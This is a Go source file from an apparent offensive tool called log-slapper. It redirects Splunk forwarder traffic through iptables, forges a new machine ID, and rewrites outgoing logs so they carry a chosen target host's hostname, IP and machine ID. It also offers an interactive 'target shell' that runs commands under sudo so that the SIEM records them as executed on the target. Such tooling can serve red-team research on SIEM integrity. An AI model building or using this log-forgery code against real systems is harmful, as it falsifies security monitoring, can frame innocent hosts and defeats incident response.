package command

import (
	"context"
	"fmt"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/oz9un/log-slapper/pkg/initialize"
	"github.com/oz9un/log-slapper/pkg/network"
	"github.com/oz9un/log-slapper/pkg/replacer"
	"github.com/pterm/pterm"
)

func RunCommand() {
	// Show a spinner while initializing IPTables
	spinner, _ := pterm.DefaultSpinner.Start("Setting up IP routing rules for traffic analysis. Please wait...")
	initialize.IptablesInit()
	spinner.Success("IPTables initialized")
	fmt.Println()
	pterm.FgYellow.Println("Enter the following details to start interception:")

	replacer.UpdateReplacements()

	// Show a spinner while updating machine ID
	spinner, _ = pterm.DefaultSpinner.Start("Generating new Machine ID...")
	time.Sleep(2 * time.Second)
	replacer.UpdateMachineId()

	spinner.Success("New Machine ID generated")
	fmt.Println()

	// Log the interception message
	pterm.DefaultSection.WithLevel(2).Println("Traffic Interception")
	//spinner, _ = pterm.DefaultSpinner.Start("From now on, whole Splunk traffic will be intercepted and examined.")

	// Create and start a fork of the default spinner.
	spinnerLiveText, _ := pterm.DefaultSpinner.Start("From now on, whole Splunk traffic will be intercepted and examined.")
	time.Sleep(5 * time.Second)
	spinnerLiveText.UpdateText("Each log sent from this computer will be manipulated with target data.") // Update spinner text.
	time.Sleep(5 * time.Second)
	spinnerLiveText.Success("Now you can also start to execute commands on behalf of the target computer!") // Resolve spinner with success message.

	//pterm.Info.Println("From now on, whole Splunk traffic will be intercepted and examined.")
	time.Sleep(3 * time.Second)

	var wg sync.WaitGroup

	// Increment the WaitGroup counter for each goroutine
	wg.Add(2)

	ctx, cancel := context.WithCancel(context.Background())

	go network.ListenPackets(ctx, &wg)

	go func() {
		defer wg.Done()

		//pterm.Info.Prefix = pterm.Prefix{Text: "TARGET SHELL", Style: pterm.NewStyle(pterm.BgCyan, pterm.FgRed)}
		//pterm.Info.MessageStyle = pterm.NewStyle(pterm.FgYellow)

		// Define a new HeaderPrinter with a red background, black text, and a margin of 20.
		newHeader := pterm.HeaderPrinter{
			TextStyle:       pterm.NewStyle(pterm.FgBlack),
			BackgroundStyle: pterm.NewStyle(pterm.BgRed),
			Margin:          20,
		}

		fmt.Print("\033[H\033[2J") // clear the terminal
		newHeader.WithFullWidth().Println("--TARGET SHELL PLAYZONE--")
		pterm.Info.Println("Enter commands to make them look they are executed on the target system. Type \"exit()\" to return to the main menu.")

		tableData1 := pterm.TableData{
			{"hostname", "ip", "machine-id"},
			{replacer.HostInfo_Replacements[0], replacer.HostInfo_Replacements[1], replacer.HostInfo_Replacements[2]},
		}

		fmt.Println()
		pterm.DefaultSection.Println("Generating data as:")
		// Create a table with a header and the defined data, then render it
		pterm.DefaultTable.WithHasHeader().WithBoxed().WithData(tableData1).Render()
		pterm.Println() // Blank line

		for {
			command, _ := pterm.DefaultInteractiveTextInput.Show("Enter command")
			command = strings.TrimSpace(command)
			if command == "exit()" {
				pterm.Info.Println("Exiting Target Shell Mode...")
				cancel() // Signal the ListenPackets to stop
				break
			}
			if command == "" {
				//pterm.Warning.Println("No command entered, please try again.")
				continue
			}

			executeCommand(command)
		}
	}()

	// Wait for all goroutines to complete
	wg.Wait()
}

func executeCommand(command string) {
	realcommand := replacer.GenerateHashGibberish(strings.Fields(command))
	pterm.DefaultSection.Println("Executing: " + realcommand)

	commandTable := pterm.TableData{
		{"original command", "actual command"},
		{command, realcommand},
	}

	fmt.Println()
	// Create a table with a header and the defined data, then render it
	pterm.DefaultTable.WithHasHeader().WithBoxed().WithData(commandTable).Render()
	pterm.Println() // Blank line

	cmd := exec.Command("sudo", strings.Fields(realcommand)[0:]...)
	//cmd.Stdout = os.Stdout
	//cmd.Stderr = os.Stderr

	cmd.Run()

	replacer.CommandMap[command] = false
}
